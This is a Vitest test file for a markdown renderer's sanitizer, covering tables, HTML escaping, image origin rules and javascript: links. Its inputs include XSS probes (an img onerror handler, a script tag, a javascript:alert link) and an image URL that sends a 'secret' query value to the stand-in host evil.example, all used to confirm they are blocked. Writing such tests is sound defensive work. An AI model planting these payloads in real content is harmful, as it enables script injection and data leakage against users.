import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

const origin = 'https://marshal.test'

describe('renderMarkdown', () => {
  it('renders tables and code blocks', () => {
    const html = renderMarkdown('| a | b |\n|---|---|\n| 1 | 2 |\n\n```\ncode\n```', origin)

    expect(html).toContain('<table>')
    expect(html).toContain('<pre><code>code\n</code></pre>')
  })

  it('escapes raw HTML', () => {
    const html = renderMarkdown('<img src=x onerror=alert(1)><script>x</script>', origin)

    expect(html).not.toContain('<img')
    expect(html).not.toContain('<script')
    expect(html).toContain('&lt;script&gt;')
  })

  it('renders an external image as a plain link to its URL', () => {
    const html = renderMarkdown('![x](https://evil.example/?q=secret)', origin)

    expect(html).not.toContain('<img')
    expect(html).toContain('<a href="https://evil.example/?q=secret" rel="noopener noreferrer" target="_blank">https://evil.example/?q=secret</a>')
  })

  it('renders a same-origin image', () => {
    const html = renderMarkdown('![snapshot](/api/v1/files/1.png)', origin)

    expect(html).toContain('<img src="/api/v1/files/1.png" alt="snapshot">')
  })

  it('treats data URLs and protocol-relative URLs as external', () => {
    expect(renderMarkdown('![a](//evil.example/a.png)', origin)).not.toContain('<img')
    expect(renderMarkdown('![a](data:image/png;base64,AAAA)', origin)).not.toContain('<img')
  })

  it('drops javascript links', () => {
    expect(renderMarkdown('[x](javascript:alert(1))', origin)).not.toContain('href="javascript')
  })
})
